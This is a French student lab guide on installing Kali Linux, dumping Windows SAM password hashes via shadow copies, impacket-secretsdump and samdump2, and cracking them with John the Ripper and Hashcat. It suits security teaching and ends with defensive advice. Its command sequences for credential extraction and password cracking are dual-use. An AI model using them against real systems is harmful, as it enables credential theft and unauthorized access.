# Guide Kali Linux & Attaque de la Base SAM

> Référence pour Étudiants en Informatique — Sécurité offensive et tests de pénétration

> ⚠️ **Avertissement légal :** Les techniques présentées dans ce document sont à des fins **strictement éducatives** dans un environnement de laboratoire isolé. Toute utilisation sur des systèmes sans autorisation explicite est **illégale** et passible de poursuites pénales. Ne pratiquez que sur vos propres machines ou dans un cadre pédagogique autorisé.

---

## Table des Matières

|#|Sujet|
|---|---|
|01|[Installation de Kali Linux](https://claude.ai/chat/7da35f10-10b8-44da-967f-d5893375973b#01--installation-de-kali-linux)|
|02|[Présentation de la base SAM](https://claude.ai/chat/7da35f10-10b8-44da-967f-d5893375973b#02--pr%C3%A9sentation-de-la-base-sam)|
|03|[Extraction des hachages SAM](https://claude.ai/chat/7da35f10-10b8-44da-967f-d5893375973b#03--extraction-des-hachages-sam)|
|04|[Attaque par dictionnaire avec John the Ripper](https://claude.ai/chat/7da35f10-10b8-44da-967f-d5893375973b#04--attaque-par-dictionnaire-avec-john-the-ripper)|
|05|[Attaque par force brute avec John the Ripper](https://claude.ai/chat/7da35f10-10b8-44da-967f-d5893375973b#05--attaque-par-force-brute-avec-john-the-ripper)|
|06|[Analyse des résultats](https://claude.ai/chat/7da35f10-10b8-44da-967f-d5893375973b#06--analyse-des-r%C3%A9sultats)|
|07|[Commandes de référence rapide](https://claude.ai/chat/7da35f10-10b8-44da-967f-d5893375973b#07--commandes-de-r%C3%A9f%C3%A9rence-rapide)|

---

## 01 — Installation de Kali Linux

### Prérequis

|Composant|Minimum|Recommandé|
|---|---|---|
|RAM|2 Go|4 Go ou plus|
|Stockage|20 Go|50 Go ou plus|
|Processeur|x64 double cœur|x64 quad-cœur|
|Réseau|Facultatif|Recommandé|

### Options d'installation

Il existe trois méthodes principales pour installer Kali Linux :

- **Machine virtuelle (VM)** — idéal pour les débutants, installation sur VirtualBox ou VMware sans affecter le système hôte
- **Dual boot** — Kali cohabite avec Windows sur le même disque
- **Installation native** — Kali comme système principal (déconseillé pour les débutants)

> **Conseil :** Pour ce guide, l'installation en **machine virtuelle** est recommandée. Elle est sûre, réversible et parfaite pour un environnement de lab.

---

### Méthode A — Installation sur VirtualBox (recommandée)

#### Étape 1 — Télécharger l'ISO Kali Linux

Rendez-vous sur le site officiel : **https://www.kali.org/get-kali/**

Choisissez l'image **Installer** (64-bit) :

```
kali-linux-2024.x-installer-amd64.iso
```

Vérifiez l'intégrité du fichier avec la somme SHA256 fournie sur le site :

```bash
# Sous Linux/macOS
sha256sum kali-linux-2024.x-installer-amd64.iso

# Sous Windows (PowerShell)
Get-FileHash kali-linux-2024.x-installer-amd64.iso -Algorithm SHA256
```

#### Étape 2 — Créer la Machine Virtuelle

1. Ouvrez **VirtualBox** → cliquez sur **Nouvelle**
2. Renseignez les paramètres suivants :

```
Nom :           Kali Linux 2024
Type :          Linux
Version :       Debian (64-bit)
RAM :           4096 Mo  (minimum 2048 Mo)
Disque dur :    Créer un nouveau disque virtuel VDI
Taille disque : 50 Go (allocation dynamique)
```

3. Avant de démarrer, configurez les paramètres supplémentaires :

```
Système → Processeur : 2 CPU
Affichage → Mémoire vidéo : 128 Mo
Réseau → Adaptateur 1 : Mode Pont (ou NAT selon votre besoin)
Stockage → Lecteur optique : sélectionner l'ISO Kali téléchargé
```

#### Étape 3 — Démarrer l'Installation

1. Démarrez la VM → le menu de démarrage Kali s'affiche
2. Sélectionnez **Graphical Install**

#### Étape 4 — Configuration de la langue et du clavier

```
Langue :            Français
Pays :              France (ou votre pays)
Disposition clavier: Français (AZERTY)
```

#### Étape 5 — Configuration réseau

```
Nom de la machine :  kali-lab
Domaine :            (laisser vide)
```

#### Étape 6 — Création du compte utilisateur

```
Nom complet :        Etudiant Lab
Nom d'utilisateur :  etudiant
Mot de passe :       [choisir un mot de passe fort]
```

> **Remarque :** Depuis Kali 2020, le compte `root` n'est plus le compte par défaut. Un utilisateur standard avec accès `sudo` est créé à la place.

#### Étape 7 — Partitionnement du disque

Sélectionnez **Utiliser un disque entier** pour une installation simple en VM :

```
Disque à partitionner :  VBOX HARDDISK (le disque virtuel)
Schéma de partitionnement : Tout dans une seule partition
→ Terminer le partitionnement et appliquer les changements
→ Confirmer : Oui
```

#### Étape 8 — Installation du système de base

L'installation copie les fichiers système (~10–20 minutes selon votre machine).

#### Étape 9 — Sélection des logiciels

Laissez la sélection par défaut :

```
✅ Kali desktop environment (GNOME ou Xfce selon la version)
✅ Top 10 — les 10 outils les plus utilisés en pentest
✅ Default recommended tools
```

#### Étape 10 — Installation du chargeur de démarrage GRUB

```
Installer GRUB sur le disque principal : Oui
Périphérique : /dev/sda
```

#### Étape 11 — Fin de l'installation

1. Retirez l'ISO du lecteur virtuel
2. Redémarrez la VM
3. Connectez-vous avec les identifiants créés à l'étape 6

---

### Méthode B — Image VirtualBox pré-configurée (plus rapide)

Kali propose des images VirtualBox et VMware prêtes à l'emploi :

1. Téléchargez l'image `.ova` sur **https://www.kali.org/get-kali/#kali-virtual-machines**
2. Dans VirtualBox : **Fichier → Importer un appareil virtuel**
3. Sélectionnez le fichier `.ova` → suivez l'assistant
4. Démarrez la VM

```
Identifiants par défaut de l'image pré-configurée :
Utilisateur : kali
Mot de passe : kali
⚠ À modifier immédiatement !
```

---

### Mise à jour post-installation

Une fois connecté, ouvrez un terminal et mettez le système à jour :

```bash
sudo apt update && sudo apt full-upgrade -y
sudo apt autoremove -y
```

Vérifiez la version installée :

```bash
cat /etc/os-release
uname -a
```

---

## 02 — Présentation de la Base SAM

### Qu'est-ce que la base SAM ?

La **SAM (Security Account Manager)** est une base de données Windows qui stocke les informations d'authentification des comptes utilisateurs locaux. Elle se trouve à l'emplacement suivant :

```
C:\Windows\System32\config\SAM
```

### Ce que contient la SAM

La SAM ne stocke **jamais** les mots de passe en clair. Elle conserve des **hachages** cryptographiques :

|Format|Description|Exemple|
|---|---|---|
|**LM Hash**|Ancien format (< Windows Vista), très faible|`aad3b435b51404ee`|
|**NTLM Hash**|Format actuel, MD4 du mot de passe en UTF-16|`31d6cfe0d16ae931b73c59d7e0c089c0`|

### Architecture de protection

```
  ┌─────────────────────────────────────┐
  │         Base de registre Windows    │
  │                                     │
  │  HKLM\SAM  ──────────────────────── │──▶ Chiffré par SYSKEY
  │  HKLM\SYSTEM  (contient la clé)  ── │──▶ Nécessaire pour déchiffrer
  │                                     │
  └─────────────────────────────────────┘

  Fichiers physiques :
  C:\Windows\System32\config\SAM
  C:\Windows\System32\config\SYSTEM
```

> **Concept clé :** La SAM est verrouillée par Windows en cours d'exécution. Il est impossible de la copier directement depuis un Windows démarré. Il faut passer par des méthodes alternatives (volume shadow copy, démarrage live, etc.).

---

## 03 — Extraction des Hachages SAM

### Environnement du lab

Pour ce laboratoire, nous utilisons :

```
Machine cible  : Windows 11 (VM VirtualBox)
Machine attaquante : Kali Linux (VM VirtualBox)
Réseau : Réseau interne VirtualBox (isolé)
Accès requis : Administrateur local sur la cible Windows
```

> ⚠️ **Ce lab nécessite un accès administrateur préalable sur la machine Windows cible.** L'objectif est d'extraire et craquer les hachages, pas de contourner l'authentification Windows.

---

### Méthode 1 — Extraction via Volume Shadow Copy (depuis Windows)

Cette méthode fonctionne depuis Windows avec des droits administrateur, sans démarrer sur un live CD.

**Sur la machine Windows 11 cible**, ouvrez un **Invite de commandes en tant qu'Administrateur** :

#### Étape 1 — Créer un cliché instantané du volume

```cmd
wmic shadowcopy call create Volume='C:\'
```

#### Étape 2 — Identifier l'ID du cliché créé

```cmd
vssadmin list shadows
```

Notez le chemin du dernier cliché, par exemple :

```
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```

#### Étape 3 — Copier les fichiers SAM et SYSTEM

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
```

#### Étape 4 — Transférer les fichiers vers Kali

Transférez `SAM` et `SYSTEM` vers votre machine Kali (via dossier partagé VM, clé USB virtuelle, ou `scp`).

---

### Méthode 2 — Extraction avec impacket-secretsdump (depuis Kali)

Si vous disposez des identifiants d'un compte administrateur Windows, vous pouvez extraire les hachages à distance depuis Kali :

```bash
# Installation d'impacket si nécessaire
sudo apt install python3-impacket -y

# Extraction à distance
impacket-secretsdump Administrateur:'MotDePasse'@192.168.1.50
```

Résultat attendu :

```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrateur:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Invité:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
etudiant:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```

---

### Méthode 3 — Extraction avec samdump2 (fichiers copiés)

Si vous avez récupéré les fichiers `SAM` et `SYSTEM` physiques :

```bash
# Installation
sudo apt install samdump2 -y

# Extraction des hachages
samdump2 SYSTEM SAM > hashes.txt

# Vérifier le contenu
cat hashes.txt
```

Résultat typique :

```
Administrateur:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
etudiant:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```

### Format des hachages NTLM

```
nom_utilisateur : RID : LM_hash : NTLM_hash :::
      │            │       │           │
      │            │       │           └── Hachage MD4 du mot de passe (32 caractères hex)
      │            │       └────────────── LM hash (désactivé sur Win Vista+, valeur vide)
      │            └────────────────────── Identifiant relatif (500 = Administrateur)
      └─────────────────────────────────── Nom du compte
```

---

## 04 — Attaque par Dictionnaire avec John the Ripper

### Principe de l'attaque par dictionnaire

Une attaque par dictionnaire teste une liste de mots de passe courants (le **dictionnaire**) en les hachant un par un et en comparant le résultat au hachage cible. Elle est rapide et efficace contre les mots de passe faibles ou courants.

```
  Dictionnaire            John the Ripper           Hachage cible
  ┌──────────┐           ┌─────────────┐           ┌─────────────┐
  │ password │ ─ hash ──▶│  MD4(mot)   │──compare─▶│ 8846f7ea... │
  │ 123456   │           └─────────────┘     ✗      └─────────────┘
  │ azerty   │                  │
  │ admin    │           ┌─────────────┐
  │ letmein  │ ─ hash ──▶│  MD4(mot)   │──compare─▶ ✓ TROUVÉ !
  └──────────┘           └─────────────┘
```

### Installation et vérification de John

```bash
# John est préinstallé sur Kali, vérifier la version
john --version

# Si absent, installer
sudo apt install john -y
```

### Préparer le fichier de hachages

Assurez-vous que votre fichier `hashes.txt` contient les hachages au format correct :

```bash
cat hashes.txt
# Attendu :
# etudiant:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```

Si vous n'avez que le hachage NTLM brut, créez un fichier au bon format :

```bash
echo "etudiant:8846f7eaee8fb117ad06bdd830b7586c" > hashes_ntlm.txt
```

### Wordlist — Rockyou.txt

Kali inclut le célèbre dictionnaire **rockyou.txt** contenant plus de 14 millions de mots de passe réels issus de fuites de données :

```bash
# Localiser rockyou.txt
locate rockyou.txt

# Il se trouve généralement ici :
ls -lh /usr/share/wordlists/rockyou.txt.gz

# Décompresser si nécessaire
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Vérifier le nombre de lignes
wc -l /usr/share/wordlists/rockyou.txt
# → 14 344 391 mots de passe
```

### Lancer l'attaque par dictionnaire

#### Attaque basique avec rockyou.txt

```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

#### Attaque avec format auto-détecté

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

#### Attaque avec règles de transformation (mangling rules)

Les règles appliquent des transformations automatiques sur chaque mot du dictionnaire (majuscules, ajout de chiffres, substitutions, etc.) :

```bash
# Règles par défaut de John
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt

# Règles Jumbo (plus complètes, Kali inclut John Jumbo)
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt --rules=jumbo hashes.txt
```

Exemples de transformations appliquées par les règles :

```
password   →  Password, PASSWORD, p@ssword, passw0rd, password123
admin      →  Admin, ADMIN, adm1n, admin!, Admin2024
```

#### Attaque avec un dictionnaire personnalisé

```bash
# Créer un dictionnaire ciblé
cat > mon_dico.txt << EOF
azerty
Azerty123
motdepasse
Motdepasse1
NomEntreprise2024
Kali@2024
EOF

john --format=NT --wordlist=mon_dico.txt hashes.txt
```

### Suivre la progression

```bash
# Pendant l'attaque, appuyez sur Entrée pour voir la progression
# Ou dans un autre terminal :
john --status

# Affichage typique :
# 0g 0:00:00:12  3.2% (ETA: 14:35:22) 0g/s 1842Kp/s 1842Kc/s
# g = mots de passe trouvés, p/s = mots testés par seconde
```

### Afficher les mots de passe trouvés

```bash
# Afficher les résultats trouvés
john --show hashes.txt

# Afficher uniquement les hachages NT
john --show --format=NT hashes.txt
```

Exemple de résultat :

```
etudiant:password:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::

1 password hash cracked, 0 left
```

> **Conseil :** John sauvegarde automatiquement sa progression dans `~/.john/john.pot`. Pour relancer une attaque sur un hachage déjà cracké, supprimez cette entrée ou utilisez `--pot=fichier_different.pot`.

---

## 05 — Attaque par Force Brute avec John the Ripper

### Principe de l'attaque par force brute

La force brute teste **toutes les combinaisons possibles** de caractères selon un jeu de caractères et une longueur définis. Elle est exhaustive mais très lente — particulièrement sur les mots de passe longs.

```
  Jeu de caractères : a-z (26 lettres)
  Longueur : 4 caractères
  Combinaisons : 26^4 = 456 976

  aaaa → aab → aac → ... → zzzz
  ┌──────────────────────────────┐
  │ Toutes les combinaisons sont │
  │ testées sans exception       │
  │ ✓ Garantit de trouver le MDP │
  │ ✗ Peut prendre très longtemps│
  └──────────────────────────────┘
```

### Modes de force brute dans John

John the Ripper utilise les **masques** pour définir précisément le jeu de caractères à utiliser.

#### Jeux de caractères disponibles (charsets)

|Symbole|Caractères inclus|
|---|---|
|`?l`|Minuscules : `a-z`|
|`?u`|Majuscules : `A-Z`|
|`?d`|Chiffres : `0-9`|
|`?s`|Symboles : `!@#$%^&*` etc.|
|`?a`|Tous : minuscules + majuscules + chiffres + symboles|
|`?h`|Hexadécimal bas : `0-9a-f`|

---

### Attaque force brute — Mode Incremental (automatique)

Le mode `--incremental` de John teste toutes les combinaisons de longueur croissante automatiquement :

```bash
# Force brute complète (très lent, toutes longueurs et tous caractères)
john --format=NT --incremental hashes.txt

# Force brute sur chiffres uniquement (codes PIN, etc.)
john --format=NT --incremental=Digits hashes.txt

# Force brute sur minuscules uniquement
john --format=NT --incremental=Lower hashes.txt

# Force brute sur minuscules + chiffres
john --format=NT --incremental=LowerNum hashes.txt

# Force brute sur l'alphabet complet
john --format=NT --incremental=Alpha hashes.txt
```

---

### Attaque force brute — Mode Masque (recommandé)

Le mode masque permet de cibler précisément la structure du mot de passe, ce qui est beaucoup plus efficace :

```bash
# Mot de passe de 4 caractères, minuscules uniquement
john --format=NT --mask='?l?l?l?l' hashes.txt

# Mot de passe de 6 chiffres (code PIN)
john --format=NT --mask='?d?d?d?d?d?d' hashes.txt

# Mot de passe de 8 caractères : 1 majuscule + 5 minuscules + 2 chiffres
john --format=NT --mask='?u?l?l?l?l?l?d?d' hashes.txt

# Mot de passe de longueur variable (6 à 8 caractères, tout type)
john --format=NT --mask='?a?a?a?a?a?a' --min-length=6 --max-length=8 hashes.txt

# Mot de passe commençant par une majuscule, suivi de minuscules et finissant par des chiffres
john --format=NT --mask='?u?l?l?l?l?d?d?d' hashes.txt
```

#### Exemple pratique — mot de passe type "Prenom2024"

```bash
# Structure : 1 majuscule + minuscules (longueur variable) + 4 chiffres
# On suppose 5 minuscules + 4 chiffres
john --format=NT --mask='?u?l?l?l?l?l?d?d?d?d' hashes.txt
```

---

### Combiner force brute et dictionnaire (attaque hybride)

Une attaque hybride combine un dictionnaire avec des mutations en suffixe/préfixe :

```bash
# Dictionnaire + chiffres en suffixe (ex: password123, admin2024)
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt \
     --mask='?w?d?d?d?d' hashes.txt

# Dictionnaire + symbole + chiffres
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt \
     --mask='?w?s?d?d' hashes.txt
```

> **Rappel :** `?w` représente le mot courant du dictionnaire dans une attaque hybride.

---

### Limiter le temps d'exécution

```bash
# Arrêter après 1 heure
john --format=NT --incremental hashes.txt --max-run-time=3600

# Arrêter après avoir trouvé N mots de passe
john --format=NT --incremental hashes.txt --max-crack=1
```

---

### Reprendre une attaque interrompue

John sauvegarde automatiquement sa progression :

```bash
# Reprendre là où l'attaque s'est arrêtée
john --restore

# Reprendre une session nommée
john --restore=nom_session

# Lancer une attaque avec un nom de session
john --format=NT --incremental hashes.txt --session=ma_session
```

---

## 06 — Analyse des Résultats

### Afficher tous les mots de passe crackés

```bash
# Afficher les résultats depuis le fichier pot
john --show hashes.txt

# Format détaillé
john --show --format=NT hashes.txt
```

### Lire le fichier .pot directement

```bash
cat ~/.john/john.pot
# Format : $NT$hash:motdepasse_en_clair
```

### Comparer les performances

|Méthode|Vitesse typique|Efficacité|
|---|---|---|
|Dictionnaire (rockyou)|~5–10 millions/s|Élevée sur mots courants|
|Dictionnaire + règles|~1–3 millions/s|Très élevée|
|Force brute (masque court)|~500K–2M/s|Totale mais lente|
|Force brute (incrémental)|Variable|Garantie mais peut prendre des années|

> **Remarque :** Les performances dépendent fortement du matériel. Un GPU dédié avec **Hashcat** est bien plus rapide que John sur CPU pour la force brute pure.

### Interpréter les résultats

```
etudiant:password → Mot de passe très faible, présent dans rockyou.txt
admin:Admin2024!  → Cracké par règles (majuscule + année + symbole)
root:[non trouvé] → Mot de passe fort ou absent du dictionnaire
```

---

### Aller plus loin — Hashcat (GPU)

Pour des attaques plus rapides avec un GPU :

```bash
# Installation
sudo apt install hashcat -y

# Attaque dictionnaire sur hachages NTLM (mode -m 1000)
hashcat -m 1000 hashes_ntlm.txt /usr/share/wordlists/rockyou.txt

# Force brute NTLM, 8 caractères, tout type
hashcat -m 1000 -a 3 hashes_ntlm.txt '?a?a?a?a?a?a?a?a'

# Règles de transformation
hashcat -m 1000 hashes_ntlm.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## 07 — Commandes de Référence Rapide

### John the Ripper

```bash
# Vérifier la version
john --version

# Attaque par dictionnaire (format NT)
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Attaque par dictionnaire avec règles
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt

# Force brute incrémentale
john --format=NT --incremental hashes.txt

# Force brute par masque (ex: 8 caractères tout type)
john --format=NT --mask='?a?a?a?a?a?a?a?a' hashes.txt

# Afficher les résultats trouvés
john --show hashes.txt

# Voir la progression
john --status

# Reprendre une session
john --restore
```

### Extraction des hachages

```bash
# Avec impacket (à distance)
impacket-secretsdump Administrateur:'mdp'@IP_CIBLE

# Avec samdump2 (fichiers locaux)
samdump2 SYSTEM SAM > hashes.txt

# Décompresser rockyou.txt
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

### Utilitaires divers

```bash
# Localiser les wordlists disponibles sur Kali
ls /usr/share/wordlists/

# Compter les lignes d'un dictionnaire
wc -l /usr/share/wordlists/rockyou.txt

# Supprimer le fichier .pot (repartir de zéro)
rm ~/.john/john.pot

# Afficher les formats supportés par John
john --list=formats | grep -i NT
```

---

### Mesures de protection (perspective défensive)

Ce laboratoire met en évidence l'importance des bonnes pratiques de sécurité :

|Bonne pratique|Raison|
|---|---|
|Mots de passe longs (16+ caractères)|Rend la force brute impraticable|
|Mots de passe complexes et uniques|Résiste aux dictionnaires et aux règles|
|Désactiver LM Hash (déjà le cas sur Win Vista+)|LM est trivial à craquer|
|Activer Windows Hello / MFA|Rend le hash inutile sans le second facteur|
|Principe du moindre privilège|Limite l'impact d'un compte compromis|
|Surveillance des événements 4624/4625|Détecte les tentatives de connexion suspectes|

---

_Guide Kali Linux & Attaque SAM · Référence pour Étudiants en Informatique · Usage pédagogique uniquement · 2025_